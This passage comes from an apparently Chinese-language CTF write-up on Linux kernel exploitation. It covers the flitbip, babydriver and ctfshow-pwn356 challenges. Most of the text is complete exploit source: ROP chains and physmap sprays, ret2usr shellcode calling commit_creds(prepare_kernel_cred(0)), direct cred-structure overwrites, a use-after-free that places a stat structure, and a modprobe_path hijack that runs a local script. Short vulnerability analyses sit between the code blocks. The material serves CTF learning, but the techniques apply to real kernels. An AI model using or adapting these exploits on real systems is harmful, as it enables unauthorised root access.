size; j++) {            if ((text[i + j]) &gt;= 32 &amp;&amp; text[i+j] &lt;127) {                write(1, &amp;text[i+j], 1);            } else {                write(1, \".\", 1);            }        }        write(1,\"|\",1);        write(1,\"\\n\", 1);    }}‍‍exploit‍​​​​  prepare_kernel_cred​​  swapgs_restore_regs_and_return_to_usermode​​‍  提权​​‍  exploit#include \"minilib.h\"char flag[0x50] = {0};int fd;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}static void get_root_shell(){    int uid = getuid();    hex(uid);    system(\"/bin/sh\");    //chmod(\"/flag\",0777);    syscall64(60,0);}static size_t shell_addr = &amp;get_root_shell;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );    // restore_flags    asm volatile (        \"nop;\"        \"nop;\"        \"push user_ss;\"        \"push user_sp;\"        \"push user_rflags;\"        \"push user_cs;\"        \"push shell_addr;\"        \"swapgs;\"        \"iretq;\"    );}size_t sc_addr = &amp;shellcode + 8;void modprobe_rce(){    system(\"echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag\\n' &gt; /tmp/e1\");    system(\"chmod +x /tmp/e1\");    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' &gt; /tmp/e2\");    system(\"chmod +x /tmp/e2\");    system(\"/tmp/e2\");      // sh: /tmp/e2: Permission denied    system(\"/tmp/e2\");      // ./tmp/e2: line 1: : not found    system(\"cat /flag\");    system(\"cat /flag\");}size_t pop_rsp_ret  = 0xffffffff811483d0;size_t add_rsp_0xC0 = 0xffffffff81488561; // cat gadget.txt |grep \"add rsp, 0xa8\", pop x N;retsize_t pop_rdi = 0xffffffff8108c6f0;size_t prepare_kernel_cred = 0xffffffff810c9540;size_t commit_creds = 0xffffffff810c92e0;size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0 + 27;void physmap_spary(){        int i = 0, j = 0;        size_t* rop;        for (i = 0; i &lt; 15000; i++)        {                rop = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);                int j = 0;                rop[j++] = add_rsp_0xC0;                rop[j++] = pop_rdi;                rop[j++] = 0;                rop[j++] = prepare_kernel_cred;                //rop[j++] = mov_rdi_rax; prepare_kernel_cred  ret 后 rax 和 rdi 是一样的所以没必要 mov 了                rop[j++] = commit_creds;                rop[j++] = swapgs_restore_regs_and_return_to_usermode;                rop[j++] = 0;                rop[j++] = 0;                rop[j++] = shell_addr;                rop[j++] = user_cs;                rop[j++] = user_rflags;                rop[j++] = user_sp;                rop[j++] = user_ss;        }}void doMain(){    save_status();    char procn[0x30] = \"/dev/kgadget\";    fd = open(procn,2);    physmap_spary();     __asm__(        \"mov r15, 0x1111;\"        \"mov r14, 0x2222;\"        \"mov r13, 0x3333;\"        \"mov r12, 0x4444;\"        \"mov r11, 0x5555;\"        \"mov r10, 0x6666;\"        \"mov r9,  pop_rsp_ret;\"        \"mov r8,  0xffff888000000000 + 0x6000000 + 8;\"        \"mov rcx, 0x9999;\"        \"mov rbx, 0xaaaa;\"        \"mov rdx, 0xffff888000000000+0x6000000;\"        \"mov rsi, 0x1BF52;\"        \"mov rdi, fd;\"        \"mov rax, 0x10;\"        \"syscall;\"        );}extern void _start(){    size_t env[0];    environ = &amp;env[4];    doMain();    syscall64(60,0);}‍‍‍midnightsun2018-flitbip(白给的漏洞)‍题目分析init 关闭了地址随机化#!/bin/bashqemu-system-x86_64 \\    -m 128M \\    -kernel ./bzImage \\    -initrd ./initrd \\    -nographic \\    -monitor /dev/null \\    -append \"nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet\" 2&gt;/dev/null‍‍添加了新的 syscall#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/sched.h&gt;#include &lt;linux/syscalls.h&gt;#define MAXFLIT 1#ifndef __NR_FLITBIP#define FLITBIP 333#endiflong flit_count = 0;EXPORT_SYMBOL(flit_count);SYSCALL_DEFINE2(flitbip, long *, addr, long, bit){        if (flit_count &gt;= MAXFLIT)        {                printk(KERN_INFO \"flitbip: sorry :/\\n\");                return -EPERM;        }        *addr ^= (1ULL &lt;&lt; (bit));        flit_count++;        return 0;}表面上看这个syscall 只能用一次， 由于 flit_count 是一个 有符号数，如果 flit_count​ 是一个负数 也会符合小于0的条件从而绕过“只能使用一次的限制”，关闭了地址刷 kaslr​  flit_count​ 地址就是已知的了，所以说第一次修改 flit_count​ 为一个负数即可多次使用 FLITBIP​‍漏洞利用过程int flitbip(size_t addr,int bit){    syscall64(333, addr, bit);}void doMain(){    size_t test_addr = 0xffffffff818f4f70;    size_t flit_count = 0xffffffff818f4f78;    flitbip(flit_count , 63);    // &gt;&gt;&gt; hex(1 &lt;&lt; 63)    // 0x8000000000000000    for(int i=0;i&lt;0x40;i++){        flitbip(test_addr,i);    }‍​​‍‍没有 /sbin/modprobe​​​‍劫持 fops​static struct tty_ldisc_ops n_tty_ops = {\t.magic           = TTY_LDISC_MAGIC,\t.name            = \"n_tty\",\t.open            = n_tty_open,\t.close           = n_tty_close,\t.flush_buffer    = n_tty_flush_buffer,\t.read            = n_tty_read,\t.write           = n_tty_write,\t.ioctl           = n_tty_ioctl,\t.set_termios     = n_tty_set_termios,\t.poll            = n_tty_poll,\t.receive_buf     = n_tty_receive_buf,\t.write_wakeup    = n_tty_write_wakeup,\t.receive_buf2\t = n_tty_receive_buf2,};# 初期化static int __init pps_tty_init(void){\tint err;\t/* Inherit the N_TTY's ops */\tn_tty_inherit_ops(&amp;pps_ldisc_ops);(snipped)跟一下​​*RAX  0xffffffffffffffff*RBX  0xffffc9000007ff58 ◂— 0*RCX  0*RDX  0 RDI  0*RSI  0xffffc9000007ff58 ◂— 0 R8   0*R9   0 R10  0*R11  0 R12  0 R13  0 R14  0 R15  0*RBP  0*RSP  0xffffc9000007ff40 ◂— 0*RIP  0xffffffff81000be5 (do_syscall_64+105) ◂— mov rax, qword ptr [rdi*8 - 0x7e9ffee0]───────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────   0xffffffff81000bcf &lt;do_syscall_64+83&gt;     cmp    rdi, 0x223   0xffffffff81000bd6 &lt;do_syscall_64+90&gt;     ja     0xffffffff81000bf9          &lt;do_syscall_64+125&gt;    0xffffffff81000bd8 &lt;do_syscall_64+92&gt;     cmp    rdi, 0x224   0xffffffff81000bdf &lt;do_syscall_64+99&gt;     sbb    rax, rax   0xffffffff81000be2 &lt;do_syscall_64+102&gt;    and    rdi, rax ► 0xffffffff81000be5 &lt;do_syscall_64+105&gt;    mov    rax, qword ptr [rdi*8 - 0x7e9ffee0]     RAX, [sys_call_table] =&gt; 0xffffffff8107b71c (__x64_sys_read) ◂— mov rdx, qword ptr [rdi + 0x60]   0xffffffff81000bed &lt;do_syscall_64+113&gt;    mov    rdi, rbx   0xffffffff81000bf0 &lt;do_syscall_64+116&gt;    call   0xffffffff81402000  直接 read 的表是只读的，改不了,可以继续跟踪，​​‍​​‍  执行到 tty_read​ 就可以看到 有一个 n_tty_ops​ 是一个RW 的权限，entry_SYSCALL_64entry_SYSCALL_64_after_hwframedo_syscall_64__x86_indirect_thunk_rax__x64_sys_readksys_readvfs_read__vfs_read__x86_indirect_thunk_r8tty_read+129 // 可以在这里断点调试__x86_indirect_thunk_raxn_tty_read​​​​​​‍  尝试修改void doMain(){    size_t test_addr = 0xffffffff818f4f70;    size_t flit_count = 0xffffffff818f4f78;    flitbip(flit_count , 63);    // for(int i=0;i&lt;0x40;i++){    //     flitbip(test_addr,i);    // }    // &gt;&gt;&gt; hex(1 &lt;&lt; 63)    // 0x8000000000000000    size_t n_tty_ops = 0xffffffff8183e320;    size_t n_tty_read_got = n_tty_ops + 0x30;    size_t n_tty_read = 0xffffffff810c8510;    size_t target = 0x4142434445464748;    size_t x = 0;    size_t y = 0;    for(int i=0;i&lt;0x40;i++){        x = (n_tty_read &gt;&gt; i) &amp; 1;        y = (target &gt;&gt; i) &amp; 1;        if(x != y){            flitbip(n_tty_read_got, i);        }    }}‍​​​‍exploit1.cSMEP 已被禁用 ,  内核态可以执行用户态的text 段， ret2shellcode#include \"minilib.h\"char flag[0x50] = {0};int fd;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}// #define MAXFLIT 1// // #ifndef __NR_FLITBIP// #define FLITBIP 333// #endif// // long flit_count = 0;// EXPORT_SYMBOL(flit_count);// // SYSCALL_DEFINE2(flitbip, long *, addr, long, bit)// {//         if (flit_count &gt;= MAXFLIT)//         {//                 printk(KERN_INFO \"flitbip: sorry :/\\n\");//                 return -EPERM;//         }// //         *addr ^= (1ULL &lt;&lt; (bit));//         flit_count++;// //         return 0;// }int flitbip(size_t addr,int bit){    syscall64(333, addr, bit);}size_t test_addr = 0xffffffff818f4f70;size_t flit_count = 0xffffffff818f4f78;size_t n_tty_ops = 0xffffffff8183e320;size_t n_tty_read = 0xffffffff810c8510;size_t target = 0x4142434445464748;//typedef void (*run_cmd_t)(char * buf);typedef size_t (*run_cmd_t)(size_t a1);static void shellcode(){    // 恢复 n_ttu_ops     size_t n_tty_read_got = n_tty_ops + 0x30;    ((size_t*)n_tty_read_got)[0] = n_tty_read;    run_cmd_t prepare_kernel_cred = (run_cmd_t)0xffffffff81033e92;    run_cmd_t commit_creds = (run_cmd_t)0xffffffff81033d41;    commit_creds(prepare_kernel_cred(0));    // 貌似没有执行命令    // run_cmd_t run_cmd = (run_cmd_t)0xffffffff81033f38;    // run_cmd(\"id &gt; /home/flitbip/id\");    asm volatile (\"ret;\");  }size_t sc_addr = (size_t)&amp;shellcode + 0xC;void doMain(){    size_t test_addr = 0xffffffff818f4f70;    size_t flit_count = 0xffffffff818f4f78;    flitbip(flit_count , 63);    // for(int i=0;i&lt;0x40;i++){    //     flitbip(test_addr,i);    // }    // &gt;&gt;&gt; hex(1 &lt;&lt; 63)    // 0x8000000000000000    size_t n_tty_read_got = n_tty_ops + 0x30;    size_t x = 0;    size_t y = 0;    for(int i=0;i&lt;0x40;i++){        x = (n_tty_read &gt;&gt; i) &amp; 1;        y = (sc_addr &gt;&gt; i) &amp; 1;        if(x != y){            flitbip(n_tty_read_got, i);        }    }    char buf[0x100] = {0};    repeat(buf, 'A', 0x80);    read(0, buf, 0x100);    system(\"/bin/sh\");}extern void _start(){    size_t env[0];    environ = (size_t)&amp;env[4];    doMain();    syscall64(60,0);}‍exploit2.c‍再来分析一下 这个​​‍‍pwndbg&gt; telescope 0xffffffff8182e04000:0000│  0xffffffff8182e040 (current_task) —▸ 0xffff88000230c000​​cred 结构体​​0x3e8 就是 1000 权限uid, 全部改成0 就是 root 了#include \"minilib.h\"char flag[0x50] = {0};int fd;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}// #define MAXFLIT 1// // #ifndef __NR_FLITBIP// #define FLITBIP 333// #endif// // long flit_count = 0;// EXPORT_SYMBOL(flit_count);// // SYSCALL_DEFINE2(flitbip, long *, addr, long, bit)// {//         if (flit_count &gt;= MAXFLIT)//         {//                 printk(KERN_INFO \"flitbip: sorry :/\\n\");//                 return -EPERM;//         }// //         *addr ^= (1ULL &lt;&lt; (bit));//         flit_count++;// //         return 0;// }int flitbip(size_t addr,int bit){    syscall64(333, addr, bit);}size_t test_addr = 0xffffffff818f4f70;size_t flit_count = 0xffffffff818f4f78;size_t n_tty_ops = 0xffffffff8183e320;size_t n_tty_read = 0xffffffff810c8510;size_t target = 0x4142434445464748;//typedef void (*run_cmd_t)(char * buf);typedef size_t (*run_cmd_t)(size_t a1);static void shellcode(){    // 恢复 n_ttu_ops     size_t n_tty_read_got = n_tty_ops + 0x30;    ((size_t*)n_tty_read_got)[0] = n_tty_read;    asm volatile(        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"nop;\"        \"mov rax, 0xffffffff8182e040;\"        \"mov rax,[rax];\"        \"add rax,0x3c0;\"        \"mov rax,[rax];\"        \"xor rdi,rdi;\"        \"add rax, 4;\"        \"mov [rax], rdi;\"        \"add rax, 8;\"        \"mov [rax], rdi;\"        \"add rax, 8;\"        \"mov [rax], rdi;\"        \"add rax, 8;\"        \"mov [rax], rdi;\"        \"ret;\"    );    // 貌似没有执行命令    // run_cmd_t run_cmd = (run_cmd_t)0xffffffff81033f38;    // run_cmd(\"id &gt; /home/flitbip/id\");  }size_t sc_addr = (size_t)&amp;shellcode + 0x8;void doMain(){    size_t test_addr = 0xffffffff818f4f70;    size_t flit_count = 0xffffffff818f4f78;    flitbip(flit_count , 63);    // for(int i=0;i&lt;0x40;i++){    //     flitbip(test_addr,i);    // }    // &gt;&gt;&gt; hex(1 &lt;&lt; 63)    // 0x8000000000000000    size_t n_tty_read_got = n_tty_ops + 0x30;    size_t target = n_tty_read ^ sc_addr;    for(int i=0;i&lt;0x40;i++){        if((target&gt;&gt;i)&amp;1){            flitbip(n_tty_read_got, i);        }    }    char buf[0x100] = {0};    repeat(buf, 'A', 0x80);    read(0, buf, 0x100);    system(\"/bin/sh\");}extern void _start(){    size_t env[0];    environ = (size_t)&amp;env[4];    doMain();    syscall64(60,0);}‍​​‍参考‍https://blog.smallkirby.com/posts/flitbip/‍ncstisc2018-babydriver(UAF)‍题目分析‍init 文件， 加载了一个ko内核驱动模块#!/bin/sh mount -t proc none /procmount -t sysfs none /sysmount -t devtmpfs devtmpfs /devecho \"flag{this_is_a_sample_flag}\" &gt; flagchown root:root flagchmod 400 flagexec 0&lt;/dev/consoleexec 1&gt;/dev/consoleexec 2&gt;/dev/consoleinsmod /lib/modules/4.4.72/babydriver.kochmod 777 /dev/babydevecho -e \"\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n\"setsid cttyhack setuidgid 1000 shumount /procumount /syspoweroff -d 0  -f  启动参数 SMEP 已启用、SMAP 已禁用、oops-&gt;panic、KASLR 已启用qemu-system-x86_64 -initrd rootfs.cpio -s \\    -kernel bzImage \\    -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \\    -enable-kvm -monitor /dev/null -m 64M \\    --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep      ​​qemu-system-x86_64​​          启动 QEMU 进行 x86_64 架构的虚拟化。qemu-system-x86_64​ 是 QEMU 提供的一个可执行文件，用于模拟 x86_64 架构的系统。            ​ ​-initrd rootfs.cpio​​          指定初始 RAM 文件系统（initrd）的路径。这里使用了 rootfs.cpio​ 作为 initrd​。initrd​ 是一个临时的根文件系统，通常用于在启动过程中提供必需的工具和驱动程序。它通常会在内核启动时被加载。            ​ ​-s​​          启用 GDB 调试服务器，并在默认的端口 1234​ 上监听连接。使用此参数后，你可以使用 GDB 连接到 QEMU 进行调试。            ​ ​-kernel bzImage​​          指定内核映像的路径。这里使用了 bzImage​，它是编译过的 Linux 内核镜像文件。bzImage​ 是一种压缩过的内核镜像格式，通常用于启动 Linux 系统。            ​ ​-append 'console=ttyS0 root=/dev/ram nokaslr oops=panic panic=1'​ ​                  启动内核时传递给内核的参数。各个参数的作用如下：                  ​console=ttyS0​：将内核的控制台输出重定向到 ttyS0​（即串行端口 0）。这允许通过串行终端看到内核启动日志和调试信息。          ​root=/dev/ram​：指定根文件系统的位置为 /dev/ram​，通常与内存文件系统一起使用，这意味着内核将从 RAM 中加载根文件系统，而不是从硬盘中读取。          ​nokaslr​：禁用地址空间布局随机化（ASLR）。ASLR 会随机化内核地址，这对于调试和一些类型的漏洞利用是不方便的，因此在调试时通常会禁用它。          ​oops=panic​：当内核发生 Oops 错误（一般指内核级的崩溃）时，触发 panic。默认行为是继续运行，但此设置将导致系统在遇到 Oops 错误时立即崩溃。          ​panic=1​：内核在 panic 时会立即重启。这里设置为 1，意味着内核发生 panic 后立即重启。                          ​ ​-enable-kvm​​          启用 KVM（Kernel-based Virtual Machine）。这使得 QEMU 使用硬件加速（如果硬件支持）来提高虚拟化性能。启用 KVM 可以显著提高模拟器的性能，尤其是在支持硬件虚拟化的处理器上。            ​ ​-monitor /dev/null​​          禁用 QEMU 的监控控制台。通常情况下，QEMU 提供一个监控界面，允许你通过命令控制虚拟机的行为。使用 /dev/null​ 作为目标会使得该接口不输出任何内容，从而禁用监控。            ​ ​-m 64M​​          指定虚拟机的内存大小为 64MB。你可以根据需要调整内存的大小，尤其是在资源受限的环境中运行 QEMU 时，减少内存消耗可能是有意义的。            ​ ​--nographic​​          禁用 QEMU 的图形输出，改为使用控制台输出。通常，在没有图形用户界面的环境中使用 --nographic​ 来使得 QEMU 在终端模式下运行，这样可以通过串行终端或标准输出查看虚拟机的输出。            ​ ​-smp cores=1,threads=1​​                  设置虚拟机的 CPU 配置：                  ​cores=1​：虚拟机有一个 CPU 核心。          ​threads=1​：每个核心只有一个线程。这意味着虚拟机只有一个 CPU 核心，没有启用超线程。                            你可以根据需要修改为更多的核心和线程。                  ​ ​-cpu kvm64,+smep​​                  设置虚拟机的 CPU 类型和特性：                  ​kvm64​：指定虚拟机使用的 CPU 模型为 kvm64​，这是 QEMU 中为 KVM 虚拟化提供的默认 CPU 模型。          ​+smep​：启用 SMEP（Supervisor Mode Execution Prevention）。SMEP 是一种硬件级别的安全机制，防止在内核模式下执行用户空间的代码。启用 SMEP 提高了虚拟机的安全性。                    ‍‍‍ko模块分析, 四个功能 open​ ioctl​ write​ read​, 还有一个 babyrelease​__int64 babyopen(){  babydev_struct = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);  G_size = 64LL;  printk(\"device open\\n\");  return 0LL;}__int64 __fastcall babyrelease(){  kfree(babydev_struct);  printk(\"device release\\n\");  return 0LL;}__int64 babyioctl(size_t fd, unsigned int cmd, size_t size){  if ( cmd == 0x10001 )  {    kfree(babydev_struct);    babydev_struct = _kmalloc(size, 37748928LL);    G_size = size;    printk(\"alloc done\\n\");    return 0LL;  }  else  {    printk(&amp;unk_2EB);    return -22LL;  }}ssize_t babywrite(size_t *file, char *user_buffer, size_t length, size_t *offset){  ssize_t result; // rax  if ( !babydev_struct )    return -1LL;  result = -2LL;  if ( G_size &gt; length )  {    copy_from_user(babydev_struct, user_buffer, length);    return length;  }  return result;}ssize_t babyread(size_t *file, char *user_buffer, size_t length, size_t *offset){  ssize_t result; // rax  if ( !babydev_struct )    return -1LL;  result = -2LL;  if ( G_size &gt; length )  {    copy_to_user(user_buffer, babydev_struct, length);    return length;  }  return result;}从上面的代码可以分析出一个UAF 漏洞, 可以同时打开两次，close fd1 一个后 会 free 堆块，没有清空指针，然后还剩一个fd2 可以继续对堆块进行操作‍出了点小问题‍无论是 有 还是没有 nokaslr​ kernel地址都没有变化，  感觉环境有点问题，所以说我用 linux 6.11 重新编译了一个ko‍stat文件 泄露地址原理‍void doMain(){    bind_core(0);    size_t *ptr1 = (size_t*)malloc(0x1000);    fd = odp(vuln_ko);    fd1 = odp(vuln_ko);    lss(\"fd = \",(size_t)fd);    ioctl(fd1, 0x10001 ,(char *)0x20); // kmalloc 0x20 UAF,     close(fd1);    int statfd = open(\"/proc/self/stat\", O_RDONLY); // 也会申请 0x20    show((char *)ptr1, 0x10);    hexdump((char *)ptr1, 0x100);}‍​​  调用链entry_SYSCALL_64do_syscall_64x64_sys_call__x64_sys_opendo_sys_openat2do_filp_openpath_openat vfs_open do_dentry_open+508__x86_indirect_thunk_array+416proc_single_opensingle_open​​然后也是申请到 了​​​‍​​‍UAF stat hijack​​修改 这个 single_start​​​调用链read(statfd, (char *)nbuf, 0x11);entry_SYSCALL_64do_syscall_64x64_sys_call__x64_sys_readksys_readvfs_read__x86_indirect_thunk_array\t\t► 0xffffffff81f8f626 &lt;__x86_indirect_thunk_array+6&gt;     mov    qword ptr [rsp], rax        [0xffffc900001cfe60] &lt;= 0xffffffff812d3f80 (seq_read) ◂— endbr64    \t\t0xffffffff81f8f62a &lt;__x86_indirect_thunk_array+10&gt;    retseq_readseq_read_iterseq_read_iter+226__x86_indirect_thunk_array‍​​​​​‍‍gadget-ROP由于这题只开启了 SMEP 并没有开启 SMAP,所以说 可以找个控制 rsp 的cat gadget.txt|grep \": mov esp, 0x\"|grep \"ret;\"// 0xffffffff81482605: mov esp, 0xebc58948; ret;size_t gadstack = 0xebc58948;size_t *nbuf = (size_t *)mmap(gadstack &amp; ~0xFFF, 4*PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);‍然后就可是ROP了​​‍exploit1#include \"minilib.h\"#define stbase(value) ((value) - 0xffffffff81000000ULL)char flag[0x50] = {0};int fd;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );}size_t sc_addr = (size_t)&amp;shellcode + 8;char *vuln_ko = \"/proc/kuaf1\";int odp(char *path){    int i = open(path, 2);    if(i&lt;0){        puts(\"open error.\");        _exit(0);    }}int fd1 =0;size_t kernel_base = 0;void doMain(){    bind_core(0);    save_status();    size_t *ptr = (size_t*)malloc(0x1000);    fd = odp(vuln_ko);    fd1 = odp(vuln_ko);    lss(\"fd = \",(size_t)fd);    ioctl(fd1, 0x10001 ,(char *)0x20); // kmalloc 0x20    close(fd1);    int statfd = open(\"/proc/self/stat\", O_RDONLY);    read(fd, (char *)ptr, 0x10);    hexdump((char *)ptr, 0x20);    size_t single_start = ptr[0];    kernel_base = single_start - stbase(0xffffffff812d2910);    lss(\"kernel_base\", kernel_base);       size_t gadstack = 0xebc58948;    // 0xffffffff81482605: mov esp, 0xebc58948; ret;    size_t target = kernel_base + stbase(0xffffffff81482605);    write(fd, (char *)&amp;target, 8);    size_t *nbuf = (size_t *)mmap(gadstack &amp; ~0xFFF, 4*PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);    size_t modprobe_path = kernel_base + stbase(0xffffffff82b3f400);    size_t pop_rdi = 0xffffffff8133e208; // pop rdi; ret;    size_t pop_rsi = 0xffffffff8103aa26; // pop rsi; ret;    size_t mov_rsi_edi = 0xffffffff81c8e47c; //mov dword ptr [rsi - 0x16000005], edi; ret;    size_t swapgs_restore_regs_and_return_to_usermode = kernel_base + stbase(0xffffffff82001637);    // 0xffffffff82001637 &lt;common_interrupt_return+103&gt;:    mov    rdi,rsp    // 0xffffffff8200163a &lt;common_interrupt_return+106&gt;:    mov    rsp,QWORD PTR gs:[rip+0x7e0049c2]        # 0x6004 &lt;cpu_tss_rw+4&gt;    // 0xffffffff82001642 &lt;common_interrupt_return+114&gt;:    push   QWORD PTR [rdi+0x30]    // 0xffffffff82001645 &lt;common_interrupt_return+117&gt;:    push   QWORD PTR [rdi+0x28]    puts(g_color \"Constructing ROP\");    char *tf[] = {\"/tmp\",\"/e1\\x00\\x00\"};    int i = 0x948/8;    nbuf[i++] = pop_rdi;    nbuf[i++] = ((int*)tf[0])[0];    nbuf[i++] = pop_rsi;    nbuf[i++] = modprobe_path + 0x16000005;    nbuf[i++] = mov_rsi_edi;    nbuf[i++] = pop_rdi;    nbuf[i++] = ((int*)tf[1])[0];    nbuf[i++] = pop_rsi;    nbuf[i++] = modprobe_path + 0x16000005 + 4;    nbuf[i++] = mov_rsi_edi;    nbuf[i++] = swapgs_restore_regs_and_return_to_usermode;    nbuf[i++] = 0;    nbuf[i++] = 0;    nbuf[i++] = (size_t)&amp;modprobe_rce;    nbuf[i++] = user_cs;    nbuf[i++] = user_rflags;    nbuf[i++] = user_sp;    nbuf[i++] = user_ss;    puts(g_color \"Hijacking RSP...\");    read(statfd, (char *)nbuf, 0x11);  }extern void _start(){    size_t env[0];    environ = (size_t)&amp;env[4];    doMain();    syscall64(60,0);}‍这题的小结‍上面利用的是 int statfd = open(\"/proc/self/stat\", O_RDONLY);​ 会申请一个 0x20 的 堆块，通过UAF对此堆块的控制流劫持（read触发）‍这题关闭里 smap  内核可以直接访问用户态的段，所以说 劫持 rsp 就变得简单了kmalloc(0x400cc0, 0x20) // `open(\"/proc/self/stat\", O_RDONLY)`不到还有没有其他结构体会用这个flags 0x400cc0‍‍ciscn-2017-babydriver‍‍exploit-1‍#include \"minilib.h\"char flag[0x50] = {0};int odp(char *path){    return open(path, 2);}void doMain(){    int fd1 = odp(\"/dev/babydev\");    int fd2 = odp(\"/dev/babydev\");    ioctl(fd1, 0x10001, (char *)0xa8);// 申请 0xa8    close(fd2); // 这里释放，但是 还有一个 fd1 可以继续控制 堆块    int pid = fork(); // 子进程会为struct cred 结构体申请一段内存空间（0xa8字节大小，对应kmalloc-0xc0） 会申请到上面free 的堆块    if(pid==0){        char buf[0x20] = {0};        write(fd1,buf,0x20); // 此时控制的就是 子进程的 cred 结构体， 把前面的个 id 改成空 就提权了        system(\"/bin/sh\");    }else{        wait(NULL);    }}extern void _start(){    size_t env[0];    environ = (size_t)&amp;env[4];    doMain();    syscall64(60,0);}‍​​‍‍‍‍ctfshow-pwn356‍题目分析‍可能是哪个比赛的题目吧？‍  init 文件#!/bin/shchown -R 0:0 / mount -t tmpfs tmpfs /tmpmount -t proc proc /procmount -t sysfs sysfs /sysmount -t devtmpfs none /dev/sbin/mdev -smkdir -p /dev/ptsmount -vt devpts -o gid=4,mode=620 none /dev/ptschmod 666 /dev/ptmxcat /proc/kallsyms &gt; /tmp/kallsyms # 通过这里可以泄露 kernel 地址echo 1 &gt; /proc/sys/kernel/kptr_restrictecho 1 &gt; /proc/sys/kernel/dmesg_restrictchown 0:0 /root/ctfshow_flagchmod 400 /root/ctfshow_flagchmod 777 /tmpinsmod /show.kocat /root/logoecho -e \"\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n\"poweroff -d 120 -f &amp;setsid ./bin/cttyhack setuidgid 1000 /bin/shecho 'sh end!\\n'umount /procumount /sys‍  一个LKM 内核模块 漏洞__int64 __fastcall show_copy_func(__int64 a1){  __int64 result; // rax  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF  v2[8] = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( a1 &gt; 63 )                                // long int 有符号比较，可以负数绕过  {    printk(&amp;unk_2A1);    return 0xFFFFFFFFLL;  }  else  {    result = 0LL;    qmemcpy(v2, &amp;name, (unsigned __int16)a1);   // len 是 unsigend short  }                                             // 然后就可以直接栈溢出  return result;}unsigned __int64 __fastcall show_read(__int64 a1){  char *v2; // rdi  __int64 i; // rcx  unsigned __int64 result; // rax  char v5[64]; // [rsp+0h] [rbp-50h] BYREF  unsigned __int64 v6; // [rsp+40h] [rbp-10h]  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = v5;  for ( i = 16LL; i; --i )  {    *(_DWORD *)v2 = 0;    v2 += 4;  }  strcpy(v5, \"Welcome to the CTFshow-KernelPWN.\\n\");  result = copy_to_user(a1, &amp;v5[off], 64LL);   // 通过控制 off 的值，可以从kernel stack 上泄露 canary  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm { swapgs }  return result;}__int64 __fastcall show_ioctl(__int64 a1, int a2, __int64 a3){  switch ( a2 )  {    case 0x6677889B:      show_read(a3);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = a3;          // 可以设置偏移      break;    case 0x6677889A:      printk(&amp;unk_2B3);      show_copy_func(a3);      break;  }  return 0LL;}‍‍exploit‍#include \"minilib.h\"#define stbase(value) ((value) - 0xffffffff81000000ULL)int fd;int odp(char *path){ return open(path, 2); }size_t hex_string_to_size_t(const char *hex_str) {    size_t result = 0;    if (hex_str[0] == '0' &amp;&amp; (hex_str[1] == 'x' || hex_str[1] == 'X')) { hex_str += 2; }    while (*hex_str) {        char c = (unsigned char)*hex_str;        if (c &gt;= '0' &amp;&amp; c &lt;= '9') {            result = result * 16 + (c - '0');        } else if (c &gt;= 'a' &amp;&amp; c &lt;= 'f') {            result = result * 16 + (c - 'a' + 10);        } else { break; }        hex_str++; } return result;}void doMain(){    bind_core(0);    save_status();    fd = odp(\"/proc/show\");    size_t buf[10] = {0};    // show    ioctl(fd,0x6677889C,(char *)0x40);    ioctl(fd,0x6677889B,(char *)&amp;buf);    lss(\"canary\",buf[0]);    size_t *rop = (size_t *)malloc(0x2000);    int fd1 = open(\"/tmp/kallsyms\",0);    char *tmp = malloc(0x1000);    read(fd1, tmp, 0x46);    read(fd1, tmp, 0x10);    tmp[0x10] = 0;    hexdump(tmp,0x100);    size_t kernel_base  = hex_string_to_size_t(tmp);    size_t pop_rdi      = kernel_base + stbase(0xffffffff81000b2f);    size_t prepare_cred = kernel_base + stbase(0xffffffff8109cce0);    size_t commit_creds = kernel_base + stbase(0xffffffff8109c8e0);    size_t vfork        = kernel_base + stbase(0xffffffff81081920);    size_t mov          = kernel_base + 